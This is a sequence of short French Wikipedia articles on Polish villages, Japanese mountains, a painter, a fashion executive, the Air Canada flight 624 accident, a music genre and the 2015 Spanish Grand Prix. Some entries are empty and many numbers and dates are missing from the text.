<doc id="8980128" url="https://fr.wikipedia.org/wiki?curid=8980128" title="Głuchów (Siedlce)">
Głuchów (Siedlce)

Głuchów (prononciation : ) est un village polonais de la gmina de Mordy dans le powiat de Siedlce de la voïvodie de Mazovie dans le centre-est de la Pologne.
Il se situe à environ à l'est de Mordy (siège de la gmina), à l'est de Siedlce (siège de le powiat) et à à l'est de Varsovie (capitale de la Pologne).
Le village comptait approximativement une population de 246 habitants en 2010.
Histoire.
De 1975 à 1998, le village appartenait administrativement à la voïvodie de Siedlce.&lt;br&gt;
Depuis 1999, il appartient administrativement à la voïvodie de Mazovie

</doc>
<doc id="8980130" url="https://fr.wikipedia.org/wiki?curid=8980130" title="Lambert (banquiers)">
Lambert (banquiers)



</doc>
<doc id="8980132" url="https://fr.wikipedia.org/wiki?curid=8980132" title="Mont Jakuchi">
Mont Jakuchi

Le est une montagne culminant à d'altitude à la limite des villes d'Iwakuni dans la préfecture de Yamaguchi et Yoshika dans la préfecture de Shimane au Japon.

</doc>
<doc id="8980135" url="https://fr.wikipedia.org/wiki?curid=8980135" title="Klimonty (Siedlce)">
Klimonty (Siedlce)

Klimonty (prononciation : ) est un village polonais de la gmina de Mordy dans le powiat de Siedlce de la voïvodie de Mazovie dans le centre-est de la Pologne.
Il se situe à environ au sud de Mordy (siège de la gmina), à l'est de Siedlce (siège de le powiat) et à à l'est de Varsovie (capitale de la Pologne).
Le village comptait approximativement une population de 161 habitants en 2010.
Histoire.
De 1975 à 1998, le village appartenait administrativement à la voïvodie de Siedlce.&lt;br&gt;
Depuis 1999, il appartient administrativement à la voïvodie de Mazovie

</doc>
<doc id="8980138" url="https://fr.wikipedia.org/wiki?curid=8980138" title="Kolonia Mordy">
Kolonia Mordy

Kolonia Mordy (prononciation : ) est un village polonais de la gmina de Mordy dans le powiat de Siedlce de la voïvodie de Mazovie dans le centre-est de la Pologne.
Il se situe à environ au sud-ouest de Mordy (siège de la gmina), à l'est de Siedlce (siège de le powiat) et à à l'est de Varsovie (capitale de la Pologne).
Le village comptait approximativement une population de 40 habitants en 2006.
Histoire.
De 1975 à 1998, le village appartenait administrativement à la voïvodie de Siedlce.&lt;br&gt;
Depuis 1999, il appartient administrativement à la voïvodie de Mazovie.

</doc>
<doc id="8980140" url="https://fr.wikipedia.org/wiki?curid=8980140" title="Quellin">
Quellin



</doc>
<doc id="8980141" url="https://fr.wikipedia.org/wiki?curid=8980141" title="Beyens (famille espagnole)">
Beyens (famille espagnole)



</doc>
<doc id="8980142" url="https://fr.wikipedia.org/wiki?curid=8980142" title="Adventure (album de Madeon)">
Adventure (album de Madeon)

Adventure est le premier album studio de Madeon sorti le . L'album est disponible en version normale et en version Deluxe, qui comprend les titres supplémentaires "Icarus, Finale, The City, Cut the Kid, Technicolor" et "Only Way Out" "(feat. Vancouver Sleep Clinic)" et un deuxième CD dans la version CD de l'album.
Remarques.
-Home, la dernière chanson de l'album est chanté par Madeon lui-même.
-Il a fait la promo de l'album avec Pay No Mind, You're On, Nonsense, Home et Imperium.
-Tout l'album a été composé en 1 an a Nantes en France.

</doc>
<doc id="8980145" url="https://fr.wikipedia.org/wiki?curid=8980145" title="Blixen-Finecke">
Blixen-Finecke



</doc>
<doc id="8980147" url="https://fr.wikipedia.org/wiki?curid=8980147" title="William Giraldi">
William Giraldi

William Giraldi, né le dans le Connecticut, est un écrivain américain.
Biographie.
Il a grandi dans le New Jersey à Manvillepuis à . Il enseigne à l'Université de Boston, ville où il vit aujourd'hui avec sa femme et ses deux fils.

</doc>
<doc id="8980148" url="https://fr.wikipedia.org/wiki?curid=8980148" title="Anisson-Duperron">
Anisson-Duperron



</doc>
<doc id="8980149" url="https://fr.wikipedia.org/wiki?curid=8980149" title="Krzymosze">
Krzymosze

Krzymosze (prononciation : ) est un village polonais de la gmina de Mordy dans le powiat de Siedlce de la voïvodie de Mazovie dans le centre-est de la Pologne.
Il se situe à environ au sud-ouest de Mordy (siège de la gmina), à l'est de Siedlce (siège de le powiat) et à à l'est de Varsovie (capitale de la Pologne).
Le village comptait approximativement une population de 326 habitants en 2010.
Histoire.
De 1975 à 1998, le village appartenait administrativement à la voïvodie de Siedlce.&lt;br&gt;
Depuis 1999, il appartient administrativement à la voïvodie de Mazovie

</doc>
<doc id="8980151" url="https://fr.wikipedia.org/wiki?curid=8980151" title="Leśniczówka (Siedlce)">
Leśniczówka (Siedlce)

Leśniczówka (prononciation : ) est un village polonais de la gmina de Mordy dans le powiat de Siedlce de la voïvodie de Mazovie dans le centre-est de la Pologne.
Le village comptait approximativement une population de 298 habitants en 2010.
Histoire.
De 1975 à 1998, le village appartenait administrativement à la voïvodie de Siedlce.&lt;br&gt;
Depuis 1999, il appartient administrativement à la voïvodie de Mazovie

</doc>
<doc id="8980152" url="https://fr.wikipedia.org/wiki?curid=8980152" title="Bernard de Marigny">
Bernard de Marigny



</doc>
<doc id="8980156" url="https://fr.wikipedia.org/wiki?curid=8980156" title="Borel de Brétizel">
Borel de Brétizel



</doc>
<doc id="8980158" url="https://fr.wikipedia.org/wiki?curid=8980158" title="Ogrodniki (Siedlce)">
Ogrodniki (Siedlce)

Ogrodniki (prononciation : ) est un village polonais de la gmina de Mordy dans le powiat de Siedlce de la voïvodie de Mazovie dans le centre-est de la Pologne.
Il se situe à environ au nord-ouest de Mordy (siège de la gmina), au nord-est de Siedlce (siège de le powiat) et à à l'est de Varsovie (capitale de la Pologne).
Le village comptait approximativement une population de 92 habitants en 2010.
Histoire.
De 1975 à 1998, le village appartenait administrativement à la voïvodie de Siedlce.&lt;br&gt;
Depuis 1999, il appartient administrativement à la voïvodie de Mazovie

</doc>
<doc id="8980160" url="https://fr.wikipedia.org/wiki?curid=8980160" title="Hippon de Samos">
Hippon de Samos

Hippon de Samos est un philosophe qui a vécu à Athènes au avant notre ère.
On sait peu de choses sur lui. Il n'est pas certain qu'il soit originaire de Samos, mais peut-être de Rhegium. On sait par le biais d'Aristophane qu'il vécut à Athènes au temps de Périclès. Il y enseignait en 478.
Jean Brun le tient pour l'un des derniers philosophes de l'école ionienne et Léon Robin décrit sa pensée comme une résurgence de cette école. Aristote le considère comme un auteur mineur.
Il reprend de Thalès l'idée d'un principe universel à l'origine de toute chose, mais il substitue à l'eau l'humidité. Il s'est intéressé à la médecine : les maladies sont dues selon lui à l'assèchement de l'humidité naturelle du corps. Aristote lui attribue l'idée que l'âme est constituée de ce principe humide. Aussi à la botanique et à l'embryologie. Bien que raillé par les poètes, il semble qu'il était très connu comme savant à son époque. Ses livres étaient présents à la bibliothèque du Lycée au siècle suivant. On l'a parfois associé aux pythagoriciens.
D'après Simplicius, on lui a reproché d'être athée.

</doc>
<doc id="8980161" url="https://fr.wikipedia.org/wiki?curid=8980161" title="Iain Canning">
Iain Canning

Iain Canning est un producteur de cinéma indépendant anglais né le à Bristol.
Biographie.
Après des études à l'Université de Glasgow, il travaille pour différentes sociétés de production, comme Lion Television, Seventh Kingdom Productions ou Warp X Films.
En 2008, il fonde See-Saw Films avec le producteur australien Emile Sherman.

</doc>
<doc id="8980163" url="https://fr.wikipedia.org/wiki?curid=8980163" title="Mont Hōbutsu">
Mont Hōbutsu

Le est une montagne culminant à d'altitude à la limite des bourgs de Hino et Kōfu dans la préfecture de Tottori. La zone autour de la montagne a été incorporée au parc national de Daisen-Oki en .

</doc>
<doc id="8980164" url="https://fr.wikipedia.org/wiki?curid=8980164" title="Olędy (Mordy)">
Olędy (Mordy)

Olędy (prononciation : ) est un village polonais de la gmina de Mordy dans le powiat de Siedlce de la voïvodie de Mazovie dans le centre-est de la Pologne.
Le village comptait approximativement une population de 83 habitants en 2010.
Histoire.
De 1975 à 1998, le village appartenait administrativement à la voïvodie de Siedlce.&lt;br&gt;
Depuis 1999, il appartient administrativement à la voïvodie de Mazovie

</doc>
<doc id="8980167" url="https://fr.wikipedia.org/wiki?curid=8980167" title="Ostoje (Mazovie)">
Ostoje (Mazovie)

Ostoje (prononciation : ) est un village polonais de la gmina de Mordy dans le powiat de Siedlce de la voïvodie de Mazovie dans le centre-est de la Pologne.
Histoire.
De 1975 à 1998, le village appartenait administrativement à la voïvodie de Siedlce.&lt;br&gt;
Depuis 1999, il appartient administrativement à la voïvodie de Mazovie

</doc>
<doc id="8980168" url="https://fr.wikipedia.org/wiki?curid=8980168" title="Les Corbeaux">
Les Corbeaux



</doc>
<doc id="8980176" url="https://fr.wikipedia.org/wiki?curid=8980176" title="Ostoje">
Ostoje

Ostoje peut désigner :
Toponymie.
en Pologne

</doc>
<doc id="8980177" url="https://fr.wikipedia.org/wiki?curid=8980177" title="Pieńki (Mordy)">
Pieńki (Mordy)

Pieńki (prononciation : ) est un village polonais de la gmina de Mordy dans le powiat de Siedlce de la voïvodie de Mazovie dans le centre-est de la Pologne.
Le village comptait approximativement une population de 43 habitants en 2010.
Histoire.
De 1975 à 1998, le village appartenait administrativement à la voïvodie de Siedlce.&lt;br&gt;
Depuis 1999, il appartient administrativement à la voïvodie de Mazovie

</doc>
<doc id="8980183" url="https://fr.wikipedia.org/wiki?curid=8980183" title="Phase (chimie)">
Phase (chimie)



</doc>
<doc id="8980189" url="https://fr.wikipedia.org/wiki?curid=8980189" title="Eugène Lomont">
Eugène Lomont

Marie Jules Eugène Lomont, dit Eugène Lomont, né le à Lure, mort le à Lure (Haute Saône), est un artiste peintre français.
Biographie.
Eugène Lomont est le fils de Claude Eugène Lomont, avoué et de Marie Marceline Levrey, sans profession. Il est né et mort dans la propriété de sa famille, l’hôtel de Vault, 24 Grande Rue à Lure.
Très tôt, il s’est consacré à la peinture encouragé par sa mère qui était elle-même un peintre très brillant, une passion qu’elle n’a pratiquée que dans le cadre familial.
Entouré par sa famille lettrée et esthète (son frère Charles Lomont, officier de marine et collectionneur, écrira un roman non publié), il devient à Paris l’élève de Bouguereau et de Tony Robert-Fleury, tous deux professeurs à l’académie Julian. Admis à la société nationale des beaux-arts, il expose très régulièrement au salon, dès 1889 et jusqu’en 1896. Il y obtient de nombreuses récompenses pour ses œuvres. Il participe aux expositions du Carnegie Institute de Pittsburgh aux États-Unis qui lui décernent deux de ses prix : "medal of the third class" et "medal of the second class".
À Paris, il fait la connaissance du peintre Jules Adler, né en Haute-Saône comme lui et quasiment du même âge, surnommé « le peintre des humbles » avec lequel il restera ami toute sa vie. Il rencontre également le peintre anglais Charles Conder, un ami d'Henri de Toulouse-Lautrec, qui fit de lui un très beau portrait en 1891.
Avec Charles Conder et Henri de Toulouse-Lautrec, il partage aussi le goût des belles femmes. Son ami, Sir William Rothenstein, peintre anglais qui fit son portrait en 1892, le décrit ainsi dans son ouvrage "Men and memories - A History of the arts 1872-1922" : «Lomont had a very tender and beautiful nature...He painted tranquil and intimate interiors».
S'il a fréquenté les artistes de son temps, il n'a fait partie d'aucun mouvement et ne peut être rattaché à aucun courant. Peintre de la lumière, c'est Rembrandt qu'il a regardé et qui a été sa référence majeure.
Malheureusement, atteint d’une grave maladie, il se retire dès 1900 dans sa maison du 24 Grande Rue à Lure aux côtés de sa mère qui l’entoure et veille sur lui. Il ne peint plus.
Mais, quelque temps avant sa mort, il donne au salon une toile intitulée "S"alle de bains"" que l’État français désire acheter pour le Musée du Luxembourg. Eugène répondra « Le Louvre sinon rien! ». La toile ne sera pas vendue.
Si Eugène Lomont reste un peintre confidentiel et mystérieux dans l’histoire de la peinture française, ce n’est pas dû à la brièveté de sa carrière. C’est son traitement de la lumière qui en fait un peintre très à part. La lumière est le sujet principal de ses tableaux et c’est elle qui leur confère un espace mental éminemment contemporain.

</doc>
<doc id="8980190" url="https://fr.wikipedia.org/wiki?curid=8980190" title="Jenna Lyons">
Jenna Lyons

Jenna Lyons est une créatrice et directrice artistique de mode américaine née à Boston en 1969. Elle est la présidente (depuis 2010) et directrice artistique (depuis 2007) de J.Crew, marque américaine de prêt-à-porter. Personnalité influente pour la mode de son pays, , elle est surnommée dans le "New York Times" comme la .
Biographie.
En 1990, Jenna Lyons commence comme assistance au sein de J.Crew.
En 2007, Jenna Lyons est choisie par Mickey Drexler pour devenir la directrice des lignes femme de J.Crew. Elle devient ensuite Présidente de la marque en 2010. 
Vie privée.
Lesbienne, elle raconte qu'une journaliste l’avait contactée alors qu’elle était au travail pour lui dire qu’ils allaient publier un article sur sa relation avec Courtney Crangi. Jenna Lyons a déclaré que cela avait été traumatisant pour elle car n’était pas encore prête à faire son coming out publiquement et qu’elle n’avait même pas parlé de cette relation à ses amis et à sa famille à l’époque. En 2012, Jenna Lyons a annoncé officiellement sa relation avec Courtney Crangi. Jenna et Courtney se sont séparées en décembre 2017.

</doc>
<doc id="8980197" url="https://fr.wikipedia.org/wiki?curid=8980197" title="Liste des conseillers généraux des Bouches-du-Rhône">
Liste des conseillers généraux des Bouches-du-Rhône



</doc>
<doc id="8980199" url="https://fr.wikipedia.org/wiki?curid=8980199" title="Amphimetra">
Amphimetra

Amphimetra est un genre de crinoïdes de la famille des Himerometridae.
Description et caractéristiques.
Ce sont des comatules himérométridées pourvues de dix bras (rarement plus). Elles sont caractérisées par des pinnules proximales élargies, plus robustes et légèrement plus longues que les suivantes, mais pas excessivement distinctes. Les segments proximaux sont légèrement carénés, et les distaux lisses ou couverts de fines épines. Les segments brachiaux médians et distaux sont très courts, avec des extrémités parallèles ou subparallèles. Les cirrhes sont de longueur modérée, avec des segments souvent plus larges que longs. Les segments cirraux distaux portent des épines ou des tubercules visibles.
Liste des genres.
Selon :

</doc>
<doc id="8980204" url="https://fr.wikipedia.org/wiki?curid=8980204" title="Pióry Wielkie">
Pióry Wielkie

Głuchów (prononciation : ) est un village polonais de la gmina de Mordy dans le powiat de Siedlce de la voïvodie de Mazovie dans le centre-est de la Pologne.
Il se situe à environ au sud de Mordy (siège de la gmina), à l'est de Siedlce (siège de le powiat) et à à l'est de Varsovie (capitale de la Pologne).
Le village comptait approximativement une population de 158 habitants en 2010.
Histoire.
De 1975 à 1998, le village appartenait administrativement à la voïvodie de Siedlce.&lt;br&gt;
Depuis 1999, il appartient administrativement à la voïvodie de Mazovie

</doc>
<doc id="8980205" url="https://fr.wikipedia.org/wiki?curid=8980205" title="Scelarcis perspicillata">
Scelarcis perspicillata



</doc>
<doc id="8980206" url="https://fr.wikipedia.org/wiki?curid=8980206" title="Joseph-Étienne Malaval">
Joseph-Étienne Malaval

Joseph-Étienne Malaval, né à Lyon le et mort à Lyon (2 arrondissement) le , est un architecte français.
Biographie.
Joseph-Étienne Malaval étudie à la Martinière puis à l'école des beaux-arts de Lyon.
Réalisations.
Il réalise les travaux d'architecture suivants :
Distinctions.
Il est membre de la société académique d'architecture de Lyon en 1886 et fait chevalier de l'ordre de Saint-Grégoire-le-Grand le .

</doc>
<doc id="8980207" url="https://fr.wikipedia.org/wiki?curid=8980207" title="Pióry-Pytki">
Pióry-Pytki

Pióry-Pytki (prononciation : ) est un village polonais de la gmina de Mordy dans le powiat de Siedlce de la voïvodie de Mazovie dans le centre-est de la Pologne.
Le village comptait approximativement une population de 80 habitants en 2010.
Histoire.
De 1975 à 1998, le village appartenait administrativement à la voïvodie de Siedlce.&lt;br&gt;
Depuis 1999, il appartient administrativement à la voïvodie de Mazovie

</doc>
<doc id="8980211" url="https://fr.wikipedia.org/wiki?curid=8980211" title="Płosodrza">
Płosodrza

Płosodrza (prononciation : ) est un village polonais de la gmina de Mordy dans le powiat de Siedlce de la voïvodie de Mazovie dans le centre-est de la Pologne.
Le village comptait approximativement une population de 87 habitants en 2010.
Histoire.
De 1975 à 1998, le village appartenait administrativement à la voïvodie de Siedlce.&lt;br&gt;
Depuis 1999, il appartient administrativement à la voïvodie de Mazovie

</doc>
<doc id="8980213" url="https://fr.wikipedia.org/wiki?curid=8980213" title="Ptaszki">
Ptaszki

Ptaszki (prononciation : ) est un village polonais de la gmina de Mordy dans le powiat de Siedlce de la voïvodie de Mazovie dans le centre-est de la Pologne.
Le village comptait approximativement une population de 86 habitants en 2010.
Histoire.
De 1975 à 1998, le village appartenait administrativement à la voïvodie de Siedlce.&lt;br&gt;
Depuis 1999, il appartient administrativement à la voïvodie de Mazovie

</doc>
<doc id="8980214" url="https://fr.wikipedia.org/wiki?curid=8980214" title="Vol Air Canada 624">
Vol Air Canada 624

Le , l'Airbus A320 assurant le vol Air Canada 624, un vol intérieur régulier de passagers reliant Toronto à Halifax, a atterri avant la piste, à 3 h 43 UTC, à cause de la mauvaise visibilité due à des fortes chutes de neige. L'avion a été gravement endommagé et 23 des 138 personnes à bord ont été blessées.
Avion et équipage.
L'appareil impliqué est un Airbus A320-211, équipé de deux moteurs CFM International CFM56-5A1. Immatriculé C-FTJP (numéro de série 233), il a effectué son premier vol le . Au moment de l'incident, il est la propriété de GE Capital Aviation Services (GECAS) qui le loue à Air Canada. À la suite de l'incident, l'appareil est retiré du service.
Le commandant de bord travaille pour Air Canada depuis plus de neuf ans et totalise 11 765 heures de vol à son actif, dont 5 755 heures sur A320. Le copilote travaille pour la compagnie aérienne depuis 15 ans et compte 11 300 heures de vol, dont 6 392 heures sur A320.
Déroulement des faits.
Le vol 624 d'Air Canada a décollé de l'aéroport international Pearson de Toronto (YYZ), à destination de l'aéroport international Stanfield d'Halifax (YHZ), avec 133 passagers et cinq membres d'équipage à bord.
L'A320 assurant le vol s'est posé () avant le seuil de la piste 05, percutant une antenne et perdant son train d'atterrissage. L'appareil percute également une ligne électrique, privant l'aéroport d'énergie électrique pendant . Il a ensuite monté un remblai jusqu'au niveau de la piste, puis a dérapé sur le ventre avant de s'immobiliser après le seuil de piste.
L'avion est sérieusement endommagé : il a perdu ses trois trains d'atterrissage ainsi que son moteur gauche. Les ailes et l’empennage sont également endommagés.
Les conditions météorologiques étaient compliquées au moment de l'incident : l'avion a tenté de se poser dans des conditions tempétueuses, avec de fortes chutes de neige et une faible visibilité.
Au total, 23 blessés (dont les deux pilotes) ont été hospitalisés, certains pour des fractures ou des contusions au visage provoquées par le choc contre les sièges ou d'autres passagers.
Enquête.
L'accident a fait l'objet d'une enquête par le Bureau de la sécurité des transports du Canada (BST). Plusieurs enquêteurs du Bureau d'enquêtes et d'analyses pour la sécurité de l'aviation civile français (BEA) et deux conseillers techniques d'Airbus se sont rendus au Canada pour participer à l'enquête. À la suite de l'accident, Air Canada a révisé sa procédure d'exploitation standard incorrecte pour l'Airbus A320.
Le rapport final, publié en mai 2017, n'a révélé aucune défaillance mécanique ayant contribué à l'accident, mais a identifié plusieurs facteurs contributifs. Les enquêteurs ont déterminé que la procédure opérationnelle standard de la compagnie aérienne concernant le mode d'atterrissage sélectionné (guidage via l'angle de trajectoire de descente) reposait trop sur l'automatisation de l'A320 et avait entraîné une perte d'altitude excessive. 
Conformément à la procédure d'exploitation standard, l'équipage n'était pas tenu de surveiller l'altitude de l'avion, ni sa relation avec la piste pour ajuster l'angle de trajectoire de descente après le repère d'approche finale. Par la suite, le commandant de bord et le copilote n'ont pas remarqué, ni réagi au fait que le pilote automatique de l'avion avait sélectionné une trajectoire de descente suivant un angle vertical prononcé, provoquant une chute rapide sous l'altitude minimale de sécurité (MDA). De plus, la visibilité limitée a entravé la capacité de l'équipage à percevoir précisément son environnement.

</doc>
<doc id="8980215" url="https://fr.wikipedia.org/wiki?curid=8980215" title="Gregory Obando Brenes">
Gregory Obando Brenes



</doc>
<doc id="8980216" url="https://fr.wikipedia.org/wiki?curid=8980216" title="W. Morgan Sheppard">
W. Morgan Sheppard



</doc>
<doc id="8980217" url="https://fr.wikipedia.org/wiki?curid=8980217" title="Isaac R. Trimble">
Isaac R. Trimble

Isaac Ridgeway Trimble , né le dans le comté de Culpeper et mort le à Baltimore, est un officier de carrière de l'armée des États-Unis et ingénieur civil dans les chemins de fer. Il est officier de l'armée des États confédérés pendant la guerre de Sécession. 
Biographie.
Il participe notamment à la bataille de Gettysburg, pendant laquelle il commande la division de William Dorsey Pender tué lors de la bataille. Il participe également à la charge de Pickett, le , également à Gettysburg.
Postérité.
Dans les films "Gettysburg" (1993) et "Gods and Generals" (2003), son rôle est joué par William Morgan Sheppard.

</doc>
<doc id="8980219" url="https://fr.wikipedia.org/wiki?curid=8980219" title="Radzików Wielki">
Radzików Wielki

Radzików Wielki (prononciation : ) est un village polonais de la gmina de Mordy dans le powiat de Siedlce de la voïvodie de Mazovie dans le centre-est de la Pologne.
Il se situe à environ au sud de Mordy (siège de la gmina), à l'est de Siedlce (siège de le powiat) et à à l'est de Varsovie (capitale de la Pologne).
Le village comptait approximativement une population de 1 226 habitants en 2010.
Histoire.
De 1975 à 1998, le village appartenait administrativement à la voïvodie de Siedlce.&lt;br&gt;
Depuis 1999, il appartient administrativement à la voïvodie de Mazovie

</doc>
<doc id="8980220" url="https://fr.wikipedia.org/wiki?curid=8980220" title="José Joao Pimenta Costa Mendes">
José Joao Pimenta Costa Mendes



</doc>
<doc id="8980221" url="https://fr.wikipedia.org/wiki?curid=8980221" title="Attentat du musée du Bardo">
Attentat du musée du Bardo



</doc>
<doc id="8980222" url="https://fr.wikipedia.org/wiki?curid=8980222" title="Adult contemporary">
Adult contemporary

L'adult contemporary (AC) est un style musical, variant entre musiques vocales des années 1960, soft rock des années 1970 et ballades actuelles, caractérisé par des éléments d', de soul, de rhythm and blues, et de rock. L'adult contemporary est une continuité d' et du soft rock popularisé dans les années 1960 et 1970 caractérisée par quelques ajustements reflétant l'évolution de la musique pop/rock.
Histoire.
Premières racines.
L'adult contemporary retrace ses racines dans le format ' des années 1960, composé à 70-80 % de morceaux instrumentaux et 20-30 % de chants. Il se composait parfois de 90 % d'instruments, et d'une poignée entièrement instrumentale. Le format ', au tout début, est lancé par certaines chaînes de radio à la fin des années 1950 et début des années 1960 afin de continuer à jouer les chansons à succès mais en les différenciant des chaînes de radio étiquetées ' publie pour la première fois un classement ' le , avec 20 chansons en liste ; la première place est attribuée à " de Brook Benton. Le classement se décrit lui-même comme 
À l'origine, les chanteurs comptaient du genre Frank Sinatra, Doris Day, Johnny Mathis, Connie Francis, Nat King Cole, Perry Como, entre autres. Les enregistrements personnalisés étaient des reprises instrumentales de chansons rock 'n' roll ou pop anciennes ou récentes, diffusées sur des chaînes de radio pour faire appel à une audience de masse sans que ça ne fasse trop commercial. Après 1965, des différences entre le classement ' Hot 100 et le classement ' commencent à se faire sentir. Pour mieux refléter ce que les chaînes de radio jouent, la composition du classement change drastiquement.
Tandis que le rock continue à se renforcer, les croisements entre le Hot 100 et le " se font très rare contrairement à la première moitié des années 1960. Roger Miller, Barbra Streisand et Bobby Vinton sont les musiciens les plus célèbres du classement.
Arrivée à la radio.
Le , le classement ' est officiellement renommé ', faisant d' un terme qui définit à la fois le genre musical et son classement homonyme. La musique adult contemporary devient le format le plus diffusé à la radio pendant les années 1980. L'AC populaire évolue en une mode au fil des années ; des musiciens traditionnellement AC comme Barbra Streisand, les Carpenters, Dionne Warwick, Barry Manilow, John Denver, et Olivia Newton-John éprouvent des difficultés à atteindre le Top 40 tandis que les années 1980 progressent, et que, parallèlement à l'influence de MTV, des artistes deviennent le tremplin du format Contemporary Hit Radio, comme Richard Marx, Michael Jackson, Bonnie Tyler, George Michael, Phil Collins puis Laura Branigan.

</doc>
<doc id="8980223" url="https://fr.wikipedia.org/wiki?curid=8980223" title="Radzików-Kornica">
Radzików-Kornica

Radzików-Kornica (prononciation : ) est un village polonais de la gmina de Mordy dans le powiat de Siedlce de la voïvodie de Mazovie dans le centre-est de la Pologne.
Le village comptait approximativement une population de 129 habitants en 2010.
Histoire.
De 1975 à 1998, le village appartenait administrativement à la voïvodie de Siedlce.&lt;br&gt;
Depuis 1999, il appartient administrativement à la voïvodie de Mazovie

</doc>
<doc id="8980233" url="https://fr.wikipedia.org/wiki?curid=8980233" title="Grand Prix automobile d'Espagne 2015">
Grand Prix automobile d'Espagne 2015

Le Grand Prix automobile d'Espagne 2015 (), disputé le sur le circuit de Catalunya à Barcelone, est la du championnat du monde de Formule 1 courue depuis 1950 et la cinquième manche du championnat 2015. Il s'agit de la quarante-cinquième édition du Grand Prix d'Espagne comptant pour le championnat du monde de Formule 1. L'épreuve se dispute pour la vingt-cinquième fois depuis 1991 sur le circuit catalan (contre neuf fois à Jarama, cinq fois à Jerez et quatre fois au Circuit de Montjuïc).
Lors de la troisième phase des qualifications, Nico Rosberg se met, dès sa première tentative, hors de portée de son coéquipier Lewis Hamilton et, en le devançant de 3/10e de seconde, met un terme à son invincibilité dans cet exercice depuis le début de la saison ; Rosberg réalise la seizième pole position de sa carrière, sa seconde sur le circuit catalan. À une demi-seconde de la deuxième Flèche d'argent, Sebastian Vettel obtient le troisième temps et part en deuxième ligne, aux côtés de Valtteri Bottas. Les jeunes pilotes de la Scuderia Toro Rosso, Carlos Sainz Jr. et Max Verstappen occupent la troisième ligne et devancent la Ferrari SF15-T de Kimi Räikkönen et la Red Bull RB11 de Daniil Kvyat.
Nico Rosberg, qui a parfaitement réussi son départ depuis la pole position, contrôle la course jusqu'au bout pour remporter sa première victoire de la saison, la neuvième de sa carrière. Derrière lui, Sebastian Vettel, sur le côté propre de la piste, réussit un meilleur envol que Lewis Hamilton, lui ravit la deuxième position et le contient tout au long du premier relais, ce qui contraint le champion du monde en titre à tenter une stratégie à trois arrêts qui s'avère payante après son ultime passage au stand ; il assure ainsi le dix-neuvième doublé de l'écurie Mercedes Grand Prix tout en réalisant, au cinquante-quatrième tour, le meilleur temps en course, tandis que Vettel obtient son quatrième podium de la saison. Valtteri Bottas termine à la même place que sur la grille de départ, contenant dans les derniers tours les assauts de Kimi Räikkönen qui se classe cinquième devant Felipe Massa. Daniel Ricciardo est septième, à un tour, suivi par Romain Grosjean qui marque pour la troisième fois de suite. Carlos Sainz Jr. et Daniil Kvyat prennent les points restants. 
Lewis Hamilton conserve son avance en tête du championnat du monde avec 111 points contre 91 pour Rosberg et 80 pour Vettel ; Räikkönen, avec 52 points devance désormais Valtteri Bottas (42 points) qui a pris le meilleur sur son coéquipier Felipe Massa (39 points) ; suivent Daniel Ricciardo (25 points) et Romain Grosjean (16 points) qui précède Felipe Nasr resté à 14 points. Mercedes conserve la tête du championnat avec 202 points devant Ferrari (132 points) et Williams (81 points) ; suivent Red Bull Racing (30 points), Sauber (toujours à 19 points), Lotus (16 points), Scuderia Toro Rosso (14 points) et Force India (11 points). McLaren et Manor Marussia n'ont pas encore inscrit de point.
Essais libres.
Première séance, le vendredi de 10 h à 11 h 30.
Il fait beau et chaud sur le circuit de Barcelone au départ de la première séance d'essais libres du Grand Prix d'Espagne. Les pilotes s'élancent dès l'ouverture de la piste pour effectuer un tour d'installation et, quelques minutes plus tard, Nico Rosberg, au volant de sa Mercedes AMG F1 W06 Hybrid, établit le temps de référence en .
Chaussés du train de pneus supplémentaire Pirelli réservé aux trente premières minutes de la séance, plusieurs pilotes se relaient en tête du classement. Si Lewis Hamilton tourne en , Rosberg repasse en tête en avant de s'incliner face à la Ferrari SF15-T pilotée par Sebastian Vettel (). Hamilton reprend la main en puis Rosberg améliore en alors qu'il reste une heure avant le drapeau à damier.
Après une première demi-heure très animée, les pilotes de pointe rentrent aux stands pour attendre une amélioration des conditions de piste ; ils espèrent que les pilotes de milieu de grille ou de fond de classement tournent suffisamment pour nettoyer la trajectoire idéale et gommer la piste. Après une vingtaine de minutes, les pilotes se relancent et, dix minutes plus tard, Lewis Hamilton se replace en tête en . Nico Rosberg améliore quelques instants plus tard, en et réalise ainsi le meilleur temps de la matinée. Tous les pilotes ont effectué leurs relais avec les pneus les plus durs, conservant leurs pneus tendres pour la suite du week-end. La Scuderia Toro Rosso, grâce au travail aérodynamique poussé entrepris par l'ingénieur James Key, s'affiche comme la troisième force provisoire du plateau : Carlos Sainz Jr. et Max Verstappen se placent en effet juste derrière les deux Mercedes et les deux Ferrari (Kimi Räikkönen tournant à un dixième de seconde de son coéquipier) . 
Daniel Ricciardo n'a bouclé que quelques tours chronométrés, lors des dernières minutes de la séance, à cause de soucis de moteur sur sa Red Bull RB11. Pastor Maldonado a également peu roulé en raison d'un problème de boîte de vitesses sur sa Lotus E23 Hybrid.
Deuxième séance, le vendredi de 14 h à 15 h 30.
La deuxième séance d'essais libres du Grand Prix d'Espagne débute sous une température ambiante de 26 °C. Daniel Ricciardo, qui a manqué une grande partie de la séance matinale à cause de soucis de moteur va, à nouveau, manquer une grande partie de cette nouvelle séance puisque Renault Sport procède à un changement de son moteur. Les pilotes s'élancent dès la piste ouverte et Marcus Ericsson, au volant de la Sauber C34, fixe le temps de référence en .
Sebastian Vettel améliore ensuite en deux temps ( puis ) mais cède face aux deux pilotes Mercedes, Nico Rosberg tournant en et Lewis Hamilton en . La séance est alors interrompue par la direction de course après que le capot arrière de la Lotus E23 Hybrid de Romain Grosjean a explosé dans la ligne droite. Bien que de nombreux débris de carbone jonchent la piste, les commissaires se montrent très efficaces et l'interruption ne dure que quelques minutes.
Alors qu'il reste une heure et dix minutes avant le drapeau à damier, Vettel chausse parmi les premiers les pneus les plus tendres fournis par Pirelli et se place en tête en . Rosberg, lui aussi désormais en pneus tendres, s'attaque au temps de son rival mais ne parvient pas à l'améliorer () ; il indique avoir du mal à engager ses rapports de boîte dans les virages. Quelques minutes plus tard, son coéquipier Lewis Hamilton réalise le meilleur temps de la session, en .
Lors de la deuxième partie de la séance, les équipes privilégient la préparation de la course et de nombreux pilotes se plaignent de la faible adhérence de la piste. Daniel Ricciardo s'élance pour seulement quatre tours en fin de séance et obtient le treizième temps quand son coéquipier Daniil Kvyat se classe cinquième, juste derrière les Mercedes et les Ferrari (Kimi Räikkönen se classant quatrième, comme lors de la première séance). Les Toro Rosso STR10 se montrent à nouveau à leur avantage, Max Verstappen pointant au sixième rang, devant l'inattendue McLaren MP4-30 de Jenson Button.
Troisième séance, le samedi de 11 h à 12 h.
